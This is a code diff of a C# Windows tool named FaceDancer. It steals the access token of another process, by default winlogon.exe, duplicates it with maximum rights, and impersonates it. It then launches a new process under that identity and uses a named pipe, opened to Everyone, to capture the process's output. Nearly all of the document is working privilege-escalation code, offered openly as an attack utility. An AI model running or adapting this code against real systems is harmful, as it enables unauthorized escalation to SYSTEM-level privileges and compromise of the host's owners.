@@ -1,65 +1,26 @@
-﻿using System;
+﻿using Microsoft.Win32.SafeHandles;
+using System;
 using System.Diagnostics;
+using System.IO;
+using System.IO.Pipes;
 using System.Linq;
 using System.Runtime.InteropServices;
+using System.Security.AccessControl;
+using System.Security.Principal;
+using System.Threading;
 
 namespace FaceDancer
 {
     class FaceDancer
     {
-        [DllImport("kernel32.dll", SetLastError = true)]
-        public static extern IntPtr OpenProcess(
-            ProcessAccessFlags processAccess,
-            bool bInheritHandle,
-            int processId
-        );
-
-        [Flags]
-        public enum ProcessAccessFlags : uint
-        {
-            All = 0x001F0FFF,
-            Terminate = 0x00000001,
-            CreateThread = 0x00000002,
-            VirtualMemoryOperation = 0x00000008,
-            VirtualMemoryRead = 0x00000010,
-            VirtualMemoryWrite = 0x00000020,
-            DuplicateHandle = 0x00000040,
-            CreateProcess = 0x000000080,
-            SetQuota = 0x00000100,
-            SetInformation = 0x00000200,
-            QueryInformation = 0x00000400,
-            QueryLimitedInformation = 0x00001000,
-            Synchronize = 0x00100000
-        }
-
         [DllImport("advapi32.dll", SetLastError = true)]
         [return: MarshalAs(UnmanagedType.Bool)]
-        static extern bool OpenProcessToken(IntPtr ProcessHandle,
-            DesiredAccess desiredAccess, out IntPtr TokenHandle);
+        internal static extern bool OpenProcessToken(IntPtr ProcessHandle,
+            uint desiredAccess, out IntPtr TokenHandle);
 
-        [Flags]
-        public enum DesiredAccess : uint
-        {
-            STANDARD_RIGHTS_REQUIRED = 0x000F0000,
-            STANDARD_RIGHTS_READ = 0x00020000,
-            TOKEN_ASSIGN_PRIMARY = 0x0001,
-            TOKEN_DUPLICATE = 0x0002,
-            TOKEN_IMPERSONATE = 0x0004,
-            TOKEN_QUERY = 0x0008,
-            TOKEN_QUERY_SOURCE = 0x0010,
-            TOKEN_ADJUST_PRIVILEGES = 0x0020,
-            TOKEN_ADJUST_GROUPS = 0x0040,
-            TOKEN_ADJUST_DEFAULT = 0x0080,
-            TOKEN_ADJUST_SESSIONID = 0x0100,
-            TOKEN_READ = (STANDARD_RIGHTS_READ | TOKEN_QUERY),
-            TOKEN_ALL_ACCESS = (STANDARD_RIGHTS_REQUIRED | TOKEN_ASSIGN_PRIMARY |
-                TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY | TOKEN_QUERY_SOURCE |
-                TOKEN_ADJUST_PRIVILEGES | TOKEN_ADJUST_GROUPS | TOKEN_ADJUST_DEFAULT |
-                TOKEN_ADJUST_SESSIONID),
-        }
 
         [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-        public extern static bool DuplicateTokenEx(
+        internal extern static bool DuplicateTokenEx(
             IntPtr hExistingToken,
             uint dwDesiredAccess,
             IntPtr lpTokenAttributes,
@@ -67,27 +28,19 @@ namespace FaceDancer
             TOKEN_TYPE TokenType,
             out IntPtr phNewToken);
 
-        [StructLayout(LayoutKind.Sequential)]
-        public struct SECURITY_ATTRIBUTES
-        {
-            public int nLength;
-            public IntPtr lpSecurityDescriptor;
-            public int bInheritHandle;
-        }
-
-        public enum TOKEN_TYPE
+        internal enum TOKEN_TYPE
         {
             TokenPrimary = 1,
             TokenImpersonation
         }
 
         [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
-        public static extern bool CreateProcessWithTokenW(IntPtr hToken, IntPtr dwLogonFlags, 
+        internal static extern bool CreateProcessWithTokenW(IntPtr hToken, IntPtr dwLogonFlags, 
             string lpApplicationName, string lpCommandLine, IntPtr dwCreationFlags, 
-            IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref IntPtr lpStartupInfo, 
+            IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, 
             out PROCESS_INFORMATION lpProcessInformation);
 
-        public enum CreationFlags
+        internal enum CreationFlags
         {
             DefaultErrorMode = 0x04000000,
             NewConsole = 0x00000010,
@@ -107,47 +60,45 @@ namespace FaceDancer
             public int dwThreadId;
         }
 
-        enum TOKEN_INFORMATION_CLASS
+        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
+        internal struct STARTUPINFO
         {
-            TokenUser = 1,
-            TokenGroups,
-            TokenPrivileges,
-            TokenOwner,
-            TokenPrimaryGroup,
-            TokenDefaultDacl,
-            TokenSource,
-            TokenType,
-            TokenImpersonationLevel,
-            TokenStatistics,
-            TokenRestrictedSids,
-            TokenSessionId,
-            TokenGroupsAndPrivileges,
-            TokenSessionReference,
-            TokenSandBoxInert,
-            TokenAuditPolicy,
-            TokenOrigin
+            public Int32 cb;
+            public IntPtr lpReserved;
+            public IntPtr lpDesktop;
+            public IntPtr lpTitle;
+            public Int32 dwX;
+            public Int32 dwY;
+            public Int32 dwXSize;
+            public Int32 dwYSize;
+            public Int32 dwXCountChars;
+            public Int32 dwYCountChars;
+            public Int32 dwFillAttribute;
+            public STARTF dwFlags;
+            public Int16 wShowWindow;
+            public Int16 cbReserved2;
+            public IntPtr lpReserved2;
+            public IntPtr hStdInput;
+            public IntPtr hStdOutput;
+            public IntPtr hStdError;
         }
 
-        public struct TOKEN_USER
+        [Flags]
+        internal enum STARTF : uint
         {
-            public SID_AND_ATTRIBUTES User;
+            STARTF_USESHOWWINDOW = 0x00000001,
+            STARTF_USESIZE = 0x00000002,
+            STARTF_USEPOSITION = 0x00000004,
+            STARTF_USECOUNTCHARS = 0x00000008,
+            STARTF_USEFILLATTRIBUTE = 0x00000010,
+            STARTF_RUNFULLSCREEN = 0x00000020,  // ignored for non-x86 platforms
+            STARTF_FORCEONFEEDBACK = 0x00000040,
+            STARTF_FORCEOFFFEEDBACK = 0x00000080,
+            STARTF_USESTDHANDLES = 0x00000100,
         }
 
-        [StructLayout(LayoutKind.Sequential)]
-        public struct SID_AND_ATTRIBUTES
-        {
-
-            public IntPtr Sid;
-            public int Attributes;
-        }
-
-        [DllImport("advapi32.dll", SetLastError = true)]
-        static extern bool GetTokenInformation(
-            IntPtr TokenHandle,
-            TOKEN_INFORMATION_CLASS TokenInformationClass,
-            IntPtr TokenInformation,
-            int TokenInformationLength,
-            out int ReturnLength);
+        [DllImport("kernel32.dll", SetLastError = true)]
+        static extern bool CloseHandle(IntPtr hObject);
 
         static void Main(string[] args)
         {
@@ -156,7 +107,7 @@ namespace FaceDancer
 
             if (args.Length < 2)
             {
-                file = "C:\\Windows\\System32\\cmd.exe";
+                file = "C:\\Windows\\System32\\nslookup.exe";
                 if (args.Length == 0)
                 {
                     // If we don't have a process ID as an argument, find winlogon.exe
@@ -180,27 +131,64 @@ namespace FaceDancer
                 procId = Convert.ToInt32(args[0]);
                 file = args[1];
             }
+            Console.WriteLine("Stealing token from PID " + procId);
 
             IntPtr tokenHandle = IntPtr.Zero;
             IntPtr dupHandle = IntPtr.Zero;
 
-            Console.WriteLine("Stealing token from PID " + procId);
+            SafeWaitHandle procHandle = new SafeWaitHandle(Process.GetProcessById(procId).Handle, true);
+            Console.WriteLine("Process handle: True");
 
-            IntPtr procHandle = OpenProcess(ProcessAccessFlags.QueryInformation, true, procId);
-            Console.WriteLine("Process handle: " + procHandle);
-
-            bool procToken = OpenProcessToken(procHandle, DesiredAccess.TOKEN_DUPLICATE, out tokenHandle);
+            bool procToken = OpenProcessToken(procHandle.DangerousGetHandle(), (uint)TokenAccessLevels.MaximumAllowed, out tokenHandle);
             Console.WriteLine("OpenProcessToken: " + procToken);
 
-            bool duplicateToken = DuplicateTokenEx(tokenHandle, 0x10000000, IntPtr.Zero, 3, TOKEN_TYPE.TokenImpersonation, out dupHandle);
+            bool duplicateToken = DuplicateTokenEx(tokenHandle, (uint)TokenAccessLevels.MaximumAllowed, IntPtr.Zero, 
+                (uint)TokenImpersonationLevel.Impersonation, TOKEN_TYPE.TokenImpersonation, out dupHandle);
             Console.WriteLine("DuplicateTokenEx: " + duplicateToken);
+            WindowsIdentity ident = new WindowsIdentity(dupHandle);
+            Console.WriteLine("Impersonated user: " + ident.Name);
+
+            STARTUPINFO startInfo = new STARTUPINFO();
+
+            // INITIALIZE NAMED PIPE CLIENT / SERVER FOR GETTING OUTPUT
+            string pipeName = "FaceDancerPipe";
+
+            PipeSecurity sec = new PipeSecurity();
+            sec.SetAccessRule(new PipeAccessRule("NT AUTHORITY\\Everyone", PipeAccessRights.FullControl, AccessControlType.Allow));
+
+            NamedPipeServerStream pipeServer = new NamedPipeServerStream(pipeName, PipeDirection.In, 
+                NamedPipeServerStream.MaxAllowedServerInstances, PipeTransmissionMode.Message, PipeOptions.None, 1024, 1024, sec);
+
+            NamedPipeClientStream pipeClient = new NamedPipeClientStream(".", pipeName, PipeDirection.Out, PipeOptions.None);
+            pipeClient.Connect();
+            pipeServer.WaitForConnection();
+            SafePipeHandle clientHandle = pipeClient.SafePipeHandle;
+
+            // Set process to use named pipe for input/output
+            startInfo.hStdOutput = clientHandle.DangerousGetHandle();
+            startInfo.dwFlags = STARTF.STARTF_USESTDHANDLES;
+            // END NAME PIPE INITIALIZATION
 
             PROCESS_INFORMATION newProc = new PROCESS_INFORMATION();
-            IntPtr startupInfo = IntPtr.Zero;
-            bool createProcess = CreateProcessWithTokenW(dupHandle, IntPtr.Zero, file, "", IntPtr.Zero, IntPtr.Zero, "C:\\Temp", ref startupInfo, out newProc);
-            Console.WriteLine("Started process with ID " + newProc.dwProcessId);
-            Console.WriteLine("CreateProcess return code: " + createProcess);
-            Console.WriteLine(Marshal.GetLastWin32Error());
+            using (StreamReader reader = new StreamReader(pipeServer))
+            {
+                bool createProcess = CreateProcessWithTokenW(dupHandle, IntPtr.Zero, null, "\"nslookup.exe\" \"www.google.com\"", IntPtr.Zero, IntPtr.Zero, "C:\\Temp", ref startInfo, out newProc);
+                Process proc = Process.GetProcessById(newProc.dwProcessId);
+                while (!proc.HasExited)
+                {
+                    Thread.Sleep(1000);
+                }
+                pipeClient.Close();
+                string output = reader.ReadToEnd();
+                Console.WriteLine("Started process with ID " + newProc.dwProcessId);
+                Console.WriteLine("CreateProcess return code: " + createProcess);
+                Console.WriteLine("Process output: " + output);
+            }
+
+            pipeServer.Close();
+            
+            CloseHandle(tokenHandle);
+            CloseHandle(dupHandle);
         }
     }
 }
